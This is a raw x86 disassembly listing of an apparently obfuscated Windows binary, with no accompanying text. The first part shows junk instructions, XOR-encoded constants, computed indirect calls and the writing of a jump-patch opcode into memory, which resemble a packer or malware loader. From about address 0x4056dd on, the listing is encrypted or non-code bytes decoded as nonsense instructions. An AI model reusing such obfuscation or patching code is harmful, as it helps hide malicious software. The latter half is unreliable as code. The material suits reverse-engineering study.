  405161:	cmp    DWORD PTR ds:0x438000,0x0
  405168:	je     0x4051b8
  40516e:	cmp    DWORD PTR ds:0x438000,0x3
  405175:	jbe    0x4051b8
  40517b:	jmp    0x40518c
  405180:	push   DWORD PTR [ebp-0x28]
  405183:	push   DWORD PTR [ebp-0xc]
  405186:	call   DWORD PTR ds:0x43a8f8
  40518c:	cmp    DWORD PTR ds:0x438000,0x4
  405193:	jne    0x4051a6
  405199:	mov    ecx,DWORD PTR ds:0x438000
  40519f:	dec    ecx
  4051a0:	mov    DWORD PTR ds:0x438000,ecx
  4051a6:	mov    ecx,DWORD PTR ds:0x438000
  4051ac:	dec    ecx
  4051ad:	mov    DWORD PTR ds:0x438000,ecx
  4051b3:	jmp    0x405161
  4051b8:	mov    eax,DWORD PTR [ebp-0x14]
  4051bb:	mov    ecx,DWORD PTR [ebp+0x8]
  4051be:	add    ecx,DWORD PTR [eax+0x1c]
  4051c1:	mov    DWORD PTR [ebp-0x14],ecx
  4051c4:	jmp    0x40521f
  4051c9:	mov    eax,DWORD PTR [ebp-0x2c]
  4051cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4051cf:	add    ecx,DWORD PTR [eax+ebx*4]
  4051d2:	mov    DWORD PTR [ebp-0x28],ecx
  4051d5:	mov    eax,DWORD PTR [ebp-0x4]
  4051d8:	mov    ecx,DWORD PTR [ebp-0x28]
  4051db:	xor    eax,esi
  4051dd:	add    eax,edi
  4051df:	cmp    ecx,eax
  4051e1:	je     0x40521f
  4051e7:	jmp    0x405210
  4051ec:	mov    eax,DWORD PTR [ebp-0x4]
  4051ef:	mov    ecx,DWORD PTR [ebp-0x8]
  4051f2:	xor    eax,esi
  4051f4:	add    eax,edi
  4051f6:	cmp    ecx,eax
  4051f8:	mov    eax,DWORD PTR [ebp-0x4]
  4051fb:	je     0x40525a
  405201:	mov    ecx,DWORD PTR [ebp-0x30]
  405204:	xor    eax,esi
  405206:	add    eax,edi
  405208:	cmp    ecx,eax
  40520a:	je     0x405263
  405210:	lea    eax,[ebp-0x8]
  405213:	push   eax
  405214:	push   DWORD PTR [ebp-0x28]
  405217:	push   DWORD PTR [ebp+0xc]
  40521a:	call   0x40a667
  40521f:	mov    eax,DWORD PTR [ebp-0x4]
  405222:	mov    ecx,DWORD PTR [ebp-0x8]
  405225:	xor    eax,esi
  405227:	add    eax,edi
  405229:	cmp    ecx,eax
  40522b:	je     0x405246
  405231:	mov    eax,DWORD PTR [ebp-0x34]
  405234:	movzx  eax,WORD PTR [eax+ebx*2]
  405238:	mov    ecx,DWORD PTR [ebp-0x14]
  40523b:	mov    eax,DWORD PTR [ecx+eax*4]
  40523e:	mov    DWORD PTR [ebp-0x38],eax
  405241:	jmp    0x4051ec
  405246:	mov    eax,DWORD PTR [ebp-0xc]
  405249:	xor    eax,esi
  40524b:	lea    ebx,[ebx+eax*1+0x3272e2]
  405252:	jmp    0x404e77
  405257:	mov    eax,DWORD PTR [ebp-0x4]
  40525a:	xor    eax,esi
  40525c:	add    eax,edi
  40525e:	jmp    0x405380
  405263:	mov    eax,DWORD PTR [ebp-0x38]
  405266:	add    eax,DWORD PTR [ebp+0x8]
  405269:	mov    DWORD PTR [ebp-0x18],eax
  40526c:	mov    eax,DWORD PTR [ebp-0x1c]
  40526f:	test   eax,eax
  405271:	je     0x40530b
  405277:	mov    DWORD PTR [ebp-0x20],0x0
  40527e:	push   0x3
  405280:	xor    edx,edx
  405282:	pop    edx
  405283:	add    edx,0x8
  405286:	push   edx
  405287:	pop    ecx
  405288:	push   0x6
  40528a:	dec    ecx
  40528b:	pop    ebx
  40528c:	dec    ebx
  40528d:	xchg   ebx,ecx
  40528f:	sub    ebx,ecx
  405291:	xchg   ebx,ecx
  405293:	dec    ecx
  405294:	mov    eax,DWORD PTR [ebp-0x1c]
  405297:	imul   eax,ecx
  40529a:	sub    esp,eax
  40529c:	mov    DWORD PTR [ebp-0x20],esp
  40529f:	mov    eax,DWORD PTR [ebp-0x4]
  4052a2:	xor    eax,esi
  4052a4:	add    eax,edi
  4052a6:	jmp    0x4052e4
  4052ab:	mov    ecx,DWORD PTR [ebp-0xc]
  4052ae:	mov    eax,DWORD PTR [ebp+0x8]
  4052b1:	mov    edx,DWORD PTR [ebp+0x14]
  4052b4:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4052b8:	xor    ecx,esi
  4052ba:	add    ecx,edi
  4052bc:	xor    edx,edx
  4052be:	div    ecx
  4052c0:	mov    ecx,DWORD PTR [ebp-0x4]
  4052c3:	xor    ecx,esi
  4052c5:	lea    eax,[ecx+eax*1+0x3272e2]
  4052cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4052cf:	mov    edx,DWORD PTR [ebp-0x20]
  4052d2:	mov    DWORD PTR [edx+ecx*4],eax
  4052d5:	mov    eax,DWORD PTR [ebp-0xc]
  4052d8:	mov    ecx,DWORD PTR [ebp+0x8]
  4052db:	xor    eax,esi
  4052dd:	lea    eax,[eax+ecx*1+0x3272e2]
  4052e4:	mov    DWORD PTR [ebp+0x8],eax
  4052e7:	mov    eax,DWORD PTR [ebp-0xc]
  4052ea:	mov    ecx,DWORD PTR [ebp+0x14]
  4052ed:	xor    eax,esi
  4052ef:	add    eax,edi
  4052f1:	imul   eax,DWORD PTR [ecx]
  4052f4:	mov    ecx,DWORD PTR [ebp-0x4]
  4052f7:	mov    edx,DWORD PTR [ebp+0x8]
  4052fa:	xor    ecx,esi
  4052fc:	lea    ecx,[ecx+edx*1+0x3272e2]
  405303:	cmp    ecx,eax
  405305:	jne    0x4052ab
  40530b:	mov    eax,DWORD PTR [ebp-0x4]
  40530e:	xor    eax,esi
  405310:	add    eax,edi
  405312:	mov    DWORD PTR [ebp-0x10],eax
  405315:	mov    ebx,0x65655
  40531a:	add    ebx,0x3234
  405320:	xchg   ebx,esi
  405322:	xor    ebx,ebx
  405324:	push   esi
  405325:	mov    esi,ebx
  405327:	pop    ebx
  405328:	mov    edx,esi
  40532a:	add    ebx,0x1002
  405330:	lea    eax,[ebp-0x18]
  405333:	add    edx,eax
  405335:	add    edx,0x5
  405338:	push   edx
  405339:	inc    esi
  40533a:	pop    ecx
  40533b:	dec    ecx
  40533c:	xchg   ecx,eax
  40533d:	dec    eax
  40533e:	xchg   ecx,eax
  40533f:	dec    ecx
  405340:	xchg   ecx,edx
  405342:	dec    edx
  405343:	push   edx
  405344:	mov    edx,ebx
  405346:	pop    ebx
  405347:	dec    ebx
  405348:	call   DWORD PTR [ebx]
  40534a:	cmp    DWORD PTR [ebp+0x10],esi
  40534d:	je     0x40536c
  405353:	xchg   edx,eax
  405354:	push   0xb
  405356:	pop    ecx
  405357:	push   0x4
  405359:	pop    ebx
  40535a:	inc    ebx
  40535b:	xchg   ebx,ecx
  40535d:	sub    ebx,ecx
  40535f:	xchg   ebx,ecx
  405361:	dec    ecx
  405362:	dec    ecx
  405363:	mov    eax,DWORD PTR [ebp-0x1c]
  405366:	imul   eax,ecx
  405369:	add    esp,eax
  40536b:	xchg   edx,eax
  40536c:	push   eax
  40536d:	xor    ebx,ebx
  40536f:	mov    edx,esp
  405371:	dec    edx
  405372:	inc    ebx
  405373:	add    ebx,DWORD PTR [edx+ebx*1]
  405376:	dec    ebx
  405377:	xor    edx,edx
  405379:	add    DWORD PTR [ebp-0x10],ebx
  40537c:	pop    ebx
  40537d:	mov    eax,DWORD PTR [ebp-0x10]
  405380:	pop    edi
  405381:	pop    esi
  405382:	pop    ebx
  405383:	leave  
  405384:	ret    0x10
  405387:	push   ebp
  405388:	mov    ebp,esp
  40538a:	sub    esp,0x7c
  40538d:	or     eax,DWORD PTR ds:0x438010
  405393:	push   esi
  405394:	add    eax,esi
  405396:	push   edi
  405397:	xor    eax,esi
  405399:	mov    eax,ds:0x43a2d4
  40539e:	mov    DWORD PTR [ebp-0x24],eax
  4053a1:	or     DWORD PTR ds:0x434010,0x1014
  4053ab:	mov    eax,ds:0x43a3e0
  4053b0:	or     edi,0x3119
  4053b6:	mov    DWORD PTR [ebp-0x34],eax
  4053b9:	and    DWORD PTR [ebp-0x30],0x0
  4053bd:	add    DWORD PTR ds:0x437004,edi
  4053c3:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  4053ca:	and    DWORD PTR ds:0x43401c,0x0
  4053d4:	jmp    0x4053e6
  4053d9:	mov    esi,DWORD PTR ds:0x43401c
  4053df:	inc    esi
  4053e0:	mov    DWORD PTR ds:0x43401c,esi
  4053e6:	cmp    DWORD PTR ds:0x43401c,0x19
  4053ed:	jae    0x405431
  4053f3:	cmp    DWORD PTR ds:0x43401c,0xb
  4053fa:	jg     0x405431
  405400:	jmp    0x405410
  405405:	push   0x437014
  40540a:	call   DWORD PTR ds:0x43a900
  405410:	cmp    DWORD PTR ds:0x43401c,0xa
  405417:	jne    0x40542c
  40541d:	xor    esi,esi
  40541f:	or     esi,DWORD PTR ds:0x43401c
  405425:	inc    esi
  405426:	mov    DWORD PTR ds:0x43401c,esi
  40542c:	jmp    0x4053d9
  405431:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  405438:	mov    ecx,DWORD PTR ds:0x416534
  40543e:	mov    eax,ds:0x416554
  405443:	sub    ecx,eax
  405445:	sub    ecx,DWORD PTR [ecx+eax*1]
  405448:	mov    eax,DWORD PTR [ebp-0x10]
  40544b:	mov    ecx,DWORD PTR ds:0x416524
  405451:	mov    esi,DWORD PTR ds:0x41653c
  405457:	sub    esi,ecx
  405459:	xor    ecx,DWORD PTR [ecx+esi*1]
  40545c:	mov    ecx,DWORD PTR [ebp-0x10]
  40545f:	sub    eax,ecx
  405461:	movzx  ecx,WORD PTR ds:0x43501c
  405468:	and    ecx,DWORD PTR ds:0x435004
  40546e:	mov    DWORD PTR ds:0x43501c,ecx
  405474:	mov    DWORD PTR [ebp-0x10],eax
  405477:	xor    DWORD PTR [ebp-0x10],0xf89cb585
  40547e:	sbb    DWORD PTR ds:0x43600c,0x633c
  405488:	mov    eax,DWORD PTR [ebp-0x18]
  40548b:	mov    DWORD PTR ds:0x435000,0x15
  405495:	cmp    DWORD PTR ds:0x435000,0x0
  40549c:	je     0x4054ce
  4054a2:	cmp    DWORD PTR ds:0x435000,0x20
  4054a9:	jge    0x4054ce
  4054af:	jmp    0x4054ba
  4054b4:	call   DWORD PTR ds:0x43a904
  4054ba:	xor    edi,edi
  4054bc:	xor    edi,DWORD PTR ds:0x435000
  4054c2:	dec    edi
  4054c3:	mov    DWORD PTR ds:0x435000,edi
  4054c9:	jmp    0x405495
  4054ce:	mov    ecx,DWORD PTR [ebp-0x18]
  4054d1:	movzx  esi,BYTE PTR ds:0x43501c
  4054d8:	xor    DWORD PTR ds:0x437018,esi
  4054de:	sub    eax,ecx
  4054e0:	mov    DWORD PTR [ebp-0x18],eax
  4054e3:	sub    DWORD PTR ds:0x436008,ebx
  4054e9:	or     DWORD PTR [ebp-0x18],0xf89f0585
  4054f0:	neg    eax
  4054f2:	mov    eax,DWORD PTR [ebp-0xc]
  4054f5:	and    DWORD PTR ds:0x43800c,0x0
  4054ff:	jmp    0x405511
  405504:	mov    ecx,DWORD PTR ds:0x43800c
  40550a:	inc    ecx
  40550b:	mov    DWORD PTR ds:0x43800c,ecx
  405511:	cmp    DWORD PTR ds:0x43800c,0x17
  405518:	jae    0x405558
  40551e:	cmp    DWORD PTR ds:0x43800c,0xe
  405525:	jge    0x405558
  40552b:	jmp    0x405539
  405530:	push   DWORD PTR [ebp-0x1c]
  405533:	call   DWORD PTR ds:0x43a8c4
  405539:	cmp    DWORD PTR ds:0x43800c,0xd
  405540:	jne    0x405553
  405546:	mov    ecx,DWORD PTR ds:0x43800c
  40554c:	inc    ecx
  40554d:	mov    DWORD PTR ds:0x43800c,ecx
  405553:	jmp    0x405504
  405558:	mov    ecx,DWORD PTR [ebp-0xc]
  40555b:	and    DWORD PTR ds:0x435018,0x0
  405565:	jmp    0x405577
  40556a:	mov    edi,DWORD PTR ds:0x435018
  405570:	inc    edi
  405571:	mov    DWORD PTR ds:0x435018,edi
  405577:	cmp    DWORD PTR ds:0x435018,0x14
  40557e:	jae    0x4055bd
  405584:	cmp    DWORD PTR ds:0x435018,0xd
  40558b:	jb     0x4055bd
  405591:	jmp    0x40559e
  405596:	push   0xc
  405598:	call   DWORD PTR ds:0x43a8c8
  40559e:	cmp    DWORD PTR ds:0x435018,0xc
  4055a5:	jne    0x4055b8
  4055ab:	mov    edi,DWORD PTR ds:0x435018
  4055b1:	inc    edi
  4055b2:	mov    DWORD PTR ds:0x435018,edi
  4055b8:	jmp    0x40556a
  4055bd:	sub    eax,ecx
  4055bf:	or     DWORD PTR ds:0x435010,edi
  4055c5:	mov    DWORD PTR [ebp-0xc],eax
  4055c8:	or     DWORD PTR [ebp-0xc],0xf89c85c5
  4055cf:	sbb    eax,ecx
  4055d1:	mov    eax,DWORD PTR [ebp-0x1c]
  4055d4:	add    DWORD PTR ds:0x436018,0x5c37
  4055de:	mov    ecx,DWORD PTR [ebp-0x1c]
  4055e1:	or     esi,edi
  4055e3:	sub    eax,ecx
  4055e5:	mov    DWORD PTR [ebp-0x1c],eax
  4055e8:	or     DWORD PTR [ebp-0x1c],0xf89c85a5
  4055ef:	mov    eax,DWORD PTR [ebp-0x20]
  4055f2:	mov    ecx,DWORD PTR [ebp-0x20]
  4055f5:	sub    eax,ecx
  4055f7:	mov    DWORD PTR [ebp-0x20],eax
  4055fa:	mov    eax,DWORD PTR [ebp-0x2c]
  4055fd:	mov    ecx,DWORD PTR [ebp-0x20]
  405600:	mov    esi,0x751089b
  405605:	xor    eax,esi
  405607:	mov    edi,0x3272e2
  40560c:	add    eax,edi
  40560e:	or     eax,ecx
  405610:	mov    DWORD PTR [ebp-0x20],eax
  405613:	mov    eax,DWORD PTR [ebp-0x4]
  405616:	mov    ecx,DWORD PTR [ebp-0x4]
  405619:	sub    eax,ecx
  40561b:	mov    DWORD PTR [ebp-0x4],eax
  40561e:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  405625:	mov    eax,DWORD PTR [ebp-0xc]
  405628:	xor    eax,esi
  40562a:	add    eax,edi
  40562c:	push   eax
  40562d:	mov    eax,DWORD PTR [ebp-0x10]
  405630:	xor    eax,esi
  405632:	add    eax,edi
  405634:	push   eax
  405635:	mov    eax,DWORD PTR [ebp-0x4]
  405638:	xor    eax,esi
  40563a:	add    eax,edi
  40563c:	push   eax
  40563d:	lea    eax,[ebp-0x7c]
  405640:	push   eax
  405641:	push   DWORD PTR [ebp-0x2c]
  405644:	push   DWORD PTR [ebp-0x28]
  405647:	call   0x40a560
  40564c:	test   eax,eax
  40564e:	je     0x40567c
  405654:	lea    eax,[ebp-0x7c]
  405657:	push   eax
  405658:	mov    eax,DWORD PTR [ebp-0x28]
  40565b:	xor    eax,esi
  40565d:	add    eax,edi
  40565f:	push   eax
  405660:	mov    eax,DWORD PTR [ebp-0x24]
  405663:	add    eax,0xaa
  405668:	push   eax
  405669:	mov    eax,DWORD PTR [ebp-0x24]
  40566c:	mov    eax,DWORD PTR [eax+0x198]
  405672:	push   DWORD PTR [eax]
  405674:	call   0x404c64
  405679:	mov    DWORD PTR [ebp-0x14],eax
  40567c:	lea    eax,[ebp+0x4]
  40567f:	mov    DWORD PTR [ebp-0x30],eax
  405682:	mov    eax,DWORD PTR [ebp-0x14]
  405685:	test   eax,eax
  405687:	je     0x407a42
  40568d:	lea    eax,[ebp-0x8]
  405690:	mov    DWORD PTR [ebp-0x38],eax
  405693:	mov    eax,DWORD PTR [ebp-0x34]
  405696:	mov    DWORD PTR [ebp-0x8],eax
  405699:	mov    eax,DWORD PTR [ebp-0x8]
  40569c:	mov    ecx,DWORD PTR [ebp-0x14]
  40569f:	sub    eax,ecx
  4056a1:	mov    DWORD PTR [ebp-0x8],eax
  4056a4:	mov    ecx,DWORD PTR [ebp-0x4]
  4056a7:	xor    ecx,esi
  4056a9:	mov    eax,0xffcd8d1e
  4056ae:	sub    eax,ecx
  4056b0:	add    DWORD PTR [ebp-0x8],eax
  4056b3:	mov    eax,DWORD PTR [ebp-0x8]
  4056b6:	mov    ecx,DWORD PTR [ebp-0x14]
  4056b9:	mov    DWORD PTR [ecx+0x1],eax
  4056bc:	mov    eax,DWORD PTR [ebp-0x14]
  4056bf:	push   DWORD PTR [ebp-0x24]
  4056c2:	mov    BYTE PTR [eax],0xe9
  4056c5:	mov    eax,ds:0x43a150
  4056ca:	push   DWORD PTR [eax]
  4056cc:	push   DWORD PTR ds:0x43a3ac
  4056d2:	push   DWORD PTR ds:0x43a158
  4056d8:	jmp    0x407a2b
  4056dd:	push   ecx
  4056de:	out    0x83,al
  4056e0:	push   ebp
  4056e1:	jae    0x4056d4
  4056e3:	jae    0x4056c7
  4056e5:	das    
  4056e6:	push   edi
  4056e7:	sbb    eax,0xd5fa6e25
  4056ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056ed:	rcr    DWORD PTR [edi+0x7c],cl
  4056f0:	jl     0x40573c
  4056f2:	pop    edi
  4056f3:	jl     0x405771
  4056f5:	jecxz  0x4056d1
  4056f7:	outs   dx,DWORD PTR ds:[esi]
  4056f8:	(bad)  
  4056f9:	fbld   TBYTE PTR [edi+0x7f32ca46]
  4056ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405700:	add    ebp,DWORD PTR [ebx-0x2b]
  405703:	ret    0x9ccd
  405706:	dec    edi
  405707:	sub    DWORD PTR [edi-0x7a],edi
  40570a:	mov    ebx,0x92715a51
  40570f:	xor    cl,BYTE PTR [edi]
  405711:	push   0xffffffb7
  405713:	jg     0x405745
  405715:	stos   DWORD PTR es:[edi],eax
  405716:	lahf   
  405717:	das    
  405718:	and    dl,bl
  40571a:	mov    ds,WORD PTR [esi]
  40571c:	adc    ah,ch
  40571e:	pusha  
  40571f:	sbb    DWORD PTR [ebx+eax*1-0x1d5f9485],edi
  405726:	ds cld 
  405728:	or     al,0xcf
  40572a:	sub    al,0x69
  40572c:	stos   BYTE PTR es:[edi],al
  40572d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40572e:	outs   dx,DWORD PTR ds:[esi]
  40572f:	mov    edi,0x694954b1
  405734:	adc    ch,ch
  405736:	rol    BYTE PTR [ebx-0x36],1
  405739:	jge    0x4056dd
  40573b:	jns    0x4056fe
  40573d:	dec    ebp
  40573e:	call   0x7a6ed87f
  405743:	mov    al,0xb6
  405745:	push   edi
  405746:	and    ch,BYTE PTR [esp+eiz*8-0x5e]
  40574a:	mov    edi,0xc0bb10cf
  40574f:	sub    eax,0x52ce2f69
  405754:	and    eax,DWORD PTR [ebp+0x36]
  405757:	iret   
  405758:	xor    DWORD PTR [edi+0x45af4f4c],0xffffffa5
  40575f:	push   edi
  405760:	push   0x256e0431
  405765:	addr16 mov ds:0x86eb,eax
  405769:	(bad)  [edi+ecx*4-0x38f03905]
  405770:	add    cl,ah
  405772:	or     cl,BYTE PTR [ecx]
  405774:	in     eax,dx
  405775:	xchg   ebp,esp
  405777:	and    BYTE PTR [ecx+0xe],0xef
  40577b:	mov    esp,0x6666e791
  405780:	arpl   cx,bp
  405782:	gs push 0x35
  405785:	icebp  
  405786:	jmp    DWORD PTR [ecx-0x9]
  405789:	dec    ebx
  40578a:	aaa    
  40578b:	punpcklwd mm2,DWORD PTR [ebp-0x248c57d3]
  405792:	sub    WORD PTR [ebx+eiz*8],0x9026
  405798:	call   0xa6ba8cf9
  40579d:	mov    edx,0x23119034
  4057a2:	mov    BYTE PTR [ebx+eax*1+0x56657309],0x20
  4057aa:	outs   dx,BYTE PTR ds:[esi]
  4057ab:	test   BYTE PTR [edi],0xe6
  4057ae:	lea    ecx,[ecx]
  4057b0:	data16 icebp 
  4057b2:	test   DWORD PTR [ebp-0x77],0x1c536592
  4057b9:	fiadd  DWORD PTR [esi]
  4057bb:	cmp    eax,0xfd8fc4b1
  4057c0:	sub    ah,BYTE PTR [eax+0x73]
  4057c3:	mov    edx,DWORD PTR [edx-0x1]
  4057c6:	xchg   ecx,eax
  4057c7:	(bad)  
  4057c8:	push   cs
  4057c9:	sti    
  4057ca:	sub    al,0x2
  4057cc:	sub    DWORD PTR [esi+0x66],ecx
  4057cf:	stos   BYTE PTR es:[edi],al
  4057d0:	(bad)  
  4057d1:	jecxz  0x4057f3
  4057d3:	add    eax,0x16a9cd28
  4057d8:	dec    eax
  4057da:	mov    ss,WORD PTR [eax+0x6b]
  4057dd:	pop    ebp
  4057de:	loope  0x4057e4
  4057e0:	cmp    bh,BYTE PTR [esi+0x1e]
  4057e3:	adc    al,ah
  4057e5:	pop    esp
  4057e6:	cmp    ecx,DWORD PTR [ecx]
  4057e8:	icebp  
  4057e9:	sahf   
  4057ea:	stc    
  4057eb:	(bad)  [ebp-0x5f]
  4057ee:	fs jp  0x405835
  4057f1:	mov    bl,0x5d
  4057f3:	shl    bh,1
  4057f5:	inc    eax
  4057f6:	xor    eax,DWORD PTR [ebx+edi*4+0x6f12125a]
  4057fd:	test   ebp,ebx
  4057ff:	(bad)  
  405800:	mov    bl,0xd7
  405802:	inc    edi
  405803:	dec    edx
  405804:	lods   al,BYTE PTR ds:[esi]
  405805:	inc    ecx
  405806:	setle  BYTE PTR [esi+0x23]
  40580a:	mov    ch,0x6f
  40580c:	pop    esi
  40580d:	leave  
  40580e:	inc    ebx
  40580f:	test   DWORD PTR [edx+0x3c06aec],esp
  405815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405816:	nop
  405817:	(bad)  
  405819:	and    dh,dl
  40581b:	sub    al,0x22
  40581d:	sub    BYTE PTR ds:0x332bba59,bl
  405823:	xor    al,0x9c
  405825:	aad    0x41
  405827:	jecxz  0x405855
  405829:	jmp    0xede06cbb
  40582e:	aaa    
  40582f:	xor    edx,ecx
  405831:	xchg   esp,eax
  405832:	inc    ebx
  405833:	shl    DWORD PTR [esi-0x3c649d73],0x57
  40583a:	je     0x405899
  40583c:	pop    edi
  40583d:	fild   WORD PTR [ebp+0x6b]
  405840:	sub    bh,BYTE PTR [eax]
  405842:	(bad)
  405845:	sub    eax,0xed84cbbe
  40584a:	inc    ecx
  40584b:	js     0x405859
  40584d:	ret    0x53ce
  405850:	outs   dx,DWORD PTR ds:[esi]
  405851:	add    DWORD PTR [ebp+ebp*2+0xeee7475],ecx
  405858:	jg     0x405842
  40585a:	pop    ss
  40585b:	scas   eax,DWORD PTR es:[edi]
  40585c:	push   es
  40585d:	mov    ds:0xe32d261f,eax
  405862:	in     al,0x45
  405864:	sbb    bh,BYTE PTR [eax]
  405866:	xchg   edx,eax
  405867:	in     eax,0xfb
  405869:	ror    DWORD PTR [ebp+0x1d],1
  40586c:	sbb    eax,0x3bafb09d
  405871:	mov    al,ds:0xf79028fa
  405876:	sar    ebp,1
  405878:	adc    esi,DWORD PTR [ebx-0x54cc14ec]
  40587e:	es sbb bl,al
  405881:	push   edx
  405882:	lahf   
  405883:	inc    eax
  405884:	mov    dl,0x92
  405886:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405887:	arpl   WORD PTR [edi+edx*2],ax
  40588a:	mov    bh,0x87
  40588c:	lea    esi,[edx-0x52]
  40588f:	cwde   
  405890:	xchg   edx,eax
  405891:	jno    0x405874
  405893:	xchg   edx,eax
  405894:	repz adc eax,0xbc951a57
  40589a:	ret    0x965
  40589d:	mov    edi,0xb61fddc8
  4058a2:	out    dx,eax
  4058a3:	adc    edi,DWORD PTR [edx+edx*8+0x13ce4d04]
  4058aa:	enter  0x7a35,0x8d
  4058ae:	shl    BYTE PTR [ebx],0xb9
  4058b1:	jle    0x40588d
  4058b3:	scas   al,BYTE PTR es:[edi]
  4058b4:	jo     0x4058a8
  4058b6:	fld    QWORD PTR [edx-0x2a]
  4058b9:	lods   al,BYTE PTR ds:[esi]
  4058ba:	lods   al,BYTE PTR ds:[esi]
  4058bb:	aas    
  4058bc:	ret    0x4da
  4058bf:	es xchg ecx,eax
  4058c1:	test   eax,0xe52239d6
  4058c6:	cs push 0xffffff84
  4058c9:	adc    DWORD PTR [ebx],ecx
  4058cb:	int3   
  4058cc:	mov    ah,0x66
  4058ce:	cmp    bl,BYTE PTR [edx-0x1]
  4058d1:	and    edi,DWORD PTR [eax]
  4058d3:	repz scas al,BYTE PTR es:[edi]
  4058d5:	outs   dx,DWORD PTR ds:[esi]
  4058d6:	or     DWORD PTR [edx*4+0x2f570011],esp
  4058dd:	pop    ss
  4058de:	scas   al,BYTE PTR es:[edi]
  4058df:	pusha  
  4058e0:	and    BYTE PTR [ebx+0x2665c9b8],dh
  4058e6:	fs xor eax,0xa7561892
  4058ec:	test   al,0x9e
  4058ee:	xor    ecx,DWORD PTR [edi+0x63]
  4058f1:	outs   dx,DWORD PTR ds:[esi]
  4058f2:	(bad)  
  4058f3:	pop    ebx
  4058f4:	dec    esp
  4058f5:	ret    
  4058f6:	dec    ebx
  4058f7:	jl     0x405917
  4058f9:	jno    0x405913
  4058fb:	out    0x3f,al
  4058fd:	push   esp
  4058fe:	cli    
  4058ff:	dec    edx
  405901:	pop    ebp
  405902:	xchg   edi,eax
  405903:	(bad)  
  405904:	xor    ebx,ecx
  405906:	in     eax,dx
  405907:	sub    al,0xed
  405909:	push   0xc48d358f
  40590e:	stos   DWORD PTR es:[edi],eax
  40590f:	push   esp
  405910:	add    BYTE PTR [ebx*8-0x374fa57f],bl
  405917:	lock inc edx
  405919:	mov    bl,0x8c
  40591b:	arpl   WORD PTR [edi],di
  40591d:	pop    edx
  40591e:	ret    0xd4ec
  405921:	sub    BYTE PTR [ebx-0x34],dl
  405924:	pushf  
  405925:	jbe    0x40598a
  405927:	mov    WORD PTR [edx+0x29],cs
  40592a:	in     al,dx
  40592b:	lahf   
  40592c:	test   al,0x99
  40592e:	mov    cl,0x66
  405930:	(bad)  
  405931:	ficom  DWORD PTR [edi]
  405933:	(bad)  
  405934:	ss sti 
  405936:	daa    
  405937:	mov    eax,0xc3e43563
  40593c:	jmp    0xf5744b7e
  405941:	retf   0x77e9
  405944:	test   dh,ch
  405946:	mov    ch,0x24
  405948:	lock out 0xe1,eax
  40594b:	pop    ecx
  40594c:	xor    esp,edx
  40594e:	mov    DWORD PTR [eax+0x5b713d13],ebx
  405954:	pusha  
  405955:	adc    DWORD PTR [esi+edi*2+0x75],edx
  405959:	push   ebx
  40595a:	mov    ebp,0xdd131460
  40595f:	mov    ebx,DWORD PTR gs:[esi+0x68]
  405963:	fadd   st,st(7)
  405965:	xchg   ebx,eax
  405966:	inc    ebp
  405968:	cld    
  405969:	pop    esi
  40596a:	cmp    al,0x42
  40596c:	sub    DWORD PTR [edi+0x3a],ecx
  40596f:	inc    esi
  405970:	or     ch,dh
  405972:	push   eax
  405973:	out    dx,al
  405974:	mov    cl,ah
  405976:	rcl    dl,1
  405978:	gs cmp eax,0x41aab031
  40597e:	xchg   esp,eax
  40597f:	in     al,0x58
  405981:	ins    DWORD PTR es:[edi],dx
  405982:	push   edi
  405983:	add    DWORD PTR [ecx],esi
  405985:	cdq    
  405986:	sahf   
  405987:	data16 add dh,BYTE PTR [eax-0x50]
  40598b:	dec    edi
  40598c:	ss ja  0x405993
  40598f:	sub    DWORD PTR [ebx-0x3b],edi
  405992:	out    dx,eax
  405993:	mov    bh,0x51
  405995:	add    eax,0x19aa0fc0
  40599a:	imul   edi,DWORD PTR [eax-0x14],0x6a
  40599e:	push   ss
  40599f:	(bad)  
  4059a0:	(bad)  
  4059a2:	mov    eax,edx
  4059a4:	les    ebx,FWORD PTR [ebx]
  4059a6:	cmc    
  4059a7:	xlat   BYTE PTR ds:[ebx]
  4059a8:	jge    0x405a24
  4059aa:	mov    esp,?
  4059ac:	mov    ecx,0xb0466204
  4059b1:	inc    eax
  4059b2:	out    dx,al
  4059b3:	aas    
  4059b4:	adc    eax,0xa5032d8e
  4059b9:	dec    ebp
  4059ba:	xor    eax,0x3940f8a8
  4059bf:	je     0x4059ee
  4059c1:	ds stos BYTE PTR es:[edi],al
  4059c3:	push   ebp
  4059c4:	push   eax
  4059c5:	add    edi,DWORD PTR [esp+ebx*8]
  4059c8:	in     eax,dx
  4059c9:	jne    0x4059e6
  4059cb:	repnz inc ebx
  4059cd:	(bad)
  4059d0:	adc    eax,0xaaef53db
  4059d5:	fiadd  WORD PTR [edx]
  4059d7:	push   ebp
  4059d8:	sbb    eax,0x2c9a3459
  4059dd:	shr    BYTE PTR [ecx-0x240f13d7],0x7a
  4059e4:	pop    ds
  4059e5:	push   cs
  4059e6:	out    dx,al
  4059e7:	and    al,0x41
  4059e9:	sbb    bl,BYTE PTR [ebx+0xd84bdd7]
  4059ef:	repnz sbb eax,0x487ec83a
  4059f5:	push   ds
  4059f6:	push   edx
  4059f7:	cdq    
  4059f8:	por    mm1,QWORD PTR [edi-0x46a7fd88]
  4059ff:	cmp    DWORD PTR [ebp-0x21ed2df6],ecx
  405a05:	mov    eax,0x30000626
  405a0a:	jne    0x405a6f
  405a0c:	fs (bad) 
  405a0e:	adc    ch,BYTE PTR [edi]
  405a10:	hlt    
  405a11:	add    edx,DWORD PTR ds:0x9b7242e5
  405a17:	dec    edx
  405a18:	es or  esi,ecx
  405a1b:	mov    bl,0x97
  405a1d:	xlat   BYTE PTR gs:[ebx]
  405a1f:	jge    0x405a36
  405a21:	xchg   al,dl
  405a23:	(bad)  
  405a24:	mov    eax,0xc3af38c5
  405a29:	shr    BYTE PTR [esi-0x2911fa9b],1
  405a2f:	push   edi
  405a30:	mov    cl,0xae
  405a32:	pop    esp
  405a33:	cs inc edi
  405a35:	jb     0x405a65
  405a37:	mov    ebp,0x7e498ec6
  405a3c:	inc    edx
  405a3d:	rol    DWORD PTR [ecx-0x31],1
  405a40:	jp     0x405abe
